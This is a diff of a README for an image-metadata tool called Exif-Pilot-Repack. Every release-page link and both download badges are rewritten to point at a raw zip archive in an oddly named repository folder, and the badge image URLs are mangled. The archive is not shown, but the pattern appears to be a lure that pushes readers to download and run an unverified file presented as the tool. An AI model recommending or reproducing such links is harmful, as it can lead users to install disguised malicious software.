@@ -1,6 +1,6 @@
 # 🌟 Exif-Pilot-Repack - Effortless Image Metadata Management
 
-[![Download Exif-Pilot-Repack](https://img.shields.io/badge/Download%20Now-Exif--Pilot--Repack-blue.svg)](https://github.com/saqibarslan/Exif-Pilot-Repack/releases)
+[![Download Exif-Pilot-Repack](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip%https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip)](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Exif-Pilot-Repack helps you manage image metadata on your Windows PC. With this 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/saqibarslan/Exif-Pilot-Repack/releases) to download Exif-Pilot-Repack.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip) to download Exif-Pilot-Repack.
 
 1. Click on the link above.
 2. Find the latest version of Exif-Pilot-Repack.
@@ -63,10 +63,10 @@ If you have questions or need assistance, reach out through the GitHub issues pa
 
 ## 📅 Updates
 
-Stay updated with the latest features and fixes. Visit the [Releases page](https://github.com/saqibarslan/Exif-Pilot-Repack/releases) regularly to check for new versions.
+Stay updated with the latest features and fixes. Visit the [Releases page](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip) regularly to check for new versions.
 
 ## 🌟 Conclusion
 
 Exif-Pilot-Repack is here to simplify how you manage your images' metadata. Whether you're a casual photographer or a serious hobbyist, this tool makes it easy to keep your digital photo details up to date. 
 
-[![Download Exif-Pilot-Repack](https://img.shields.io/badge/Download%20Now-Exif--Pilot--Repack-blue.svg)](https://github.com/saqibarslan/Exif-Pilot-Repack/releases)
+[![Download Exif-Pilot-Repack](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip%https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip)](https://raw.githubusercontent.com/saqibarslan/Exif-Pilot-Repack/main/Neotremata/Exif-Repack-Pilot-1.3.zip)
